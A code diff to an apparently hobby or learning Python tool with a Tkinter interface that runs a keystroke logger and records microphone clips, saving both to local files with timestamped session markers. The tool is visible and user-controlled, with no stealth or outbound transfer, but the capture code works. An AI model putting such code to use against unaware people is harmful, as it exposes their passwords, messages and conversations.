@@ -3,13 +3,20 @@ import sounddevice as sd
 from scipy.io.wavfile import write
 from fileinput import filename
 from pynput.keyboard import Listener, Key
+from datetime import datetime
 import tkinter as tk
 from tkinter import ttk
 import threading
 
+# Folder where this Python file is located
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+log_file = os.path.join(BASE_DIR, "keys_logs.txt")
+# create audio dir to store audio files
+AUDIO_File = os.path.join(BASE_DIR, "Audio")
+# Create the Audio directory if it doesn't exist
+os.makedirs(AUDIO_File, exist_ok=True)
+audio_information = os.path.join(BASE_DIR, "audio.wav")
 
-log_file = "keys_log.txt"
-audio_information = "audio.wav"
 
 # Record audio settings
 microphone_time = 5  # seconds
@@ -19,10 +26,10 @@ fs = 44100  # Sample rate
 def microphone(): 
     audio_count = 1
 
-    while os.path.exists(f"audio_{audio_count}.wav"): # Check if the audio file already exists
+    while os.path.exists(os.path.join(AUDIO_File, f"audio_{audio_count}.wav")):
         audio_count += 1
 
-    filename = f"audio_{audio_count}.wav"
+    filename = os.path.join(AUDIO_File, f"audio_{audio_count}.wav")
 
     print(f"Recording {filename}...")
 
@@ -40,15 +47,35 @@ def microphone():
 
 # Function to log keystrokes
 def on_press(key):
-    with open(log_file, "a") as f:
+    with open(log_file, "a", encoding="utf-8") as f:
+		
         try:
+	    # Normal Character keys
             f.write(key.char)
         except AttributeError:
-            f.write(f"[{key}]")
+	    # Special keys
+	    # extra key_name= str(key).replace("key.","")
+            f.write(f"[{key.name}]")
+            
 
         # Stop when Esc is pressed
         if key == Key.esc: 
             return False
+        print("\n")
+
+#creating function for start log_session
+def start_log_session():
+    with open(log_file, "a", encoding="utf-8") as f:
+        f.write("\n")
+        f.write("=" * 40 + "\n")
+        f.write(f"Session Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        f.write("=" * 40 + "\n")
+
+# Creating function to stop log session
+def stop_log_session():
+    with open(log_file, "a", encoding="utf-8") as f:
+        f.write(f"\n\nSession Ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        f.write("-" * 40 + "\n")
 
 
 class App:
@@ -140,34 +167,39 @@ class App:
 
     def toggle_keylogger(self):
         if not self.keylogger_running:
+            start_log_session()
             self.keylogger_running = True
             self.keylog_btn.config(text="■ Stop Keylogger")
             self.status_label.config(text="Keylogger running...")
-            self.listener_thread = threading.Thread(target=self._run_listener, daemon=True)
+            self.listener_thread = threading.Thread(
+                target=self._run_listener,
+                daemon=True
+            )
             self.listener_thread.start()
         else:
             if self.listener:
                 self.listener.stop()
-            self.keylogger_running = False
-            self.keylog_btn.config(text="▶ Start Keylogger")
-            self.status_label.config(text="Keylogger stopped")
+
 
     def _run_listener(self):
         with Listener(on_press=on_press) as listener:
             self.listener = listener
             listener.join()
+
         self.root.after(0, self._listener_stopped)
 
+
     def _listener_stopped(self):
+        stop_log_session()
         self.keylogger_running = False
         self.keylog_btn.config(text="▶ Start Keylogger")
-        self.status_label.config(text="Keylogger stopped (Esc)")
+        self.status_label.config(text="Keylogger stopped")
+
 
     def on_exit(self):
         if self.listener:
             self.listener.stop()
         self.root.destroy()
-
 
 if __name__ == "__main__":
     root = tk.Tk()
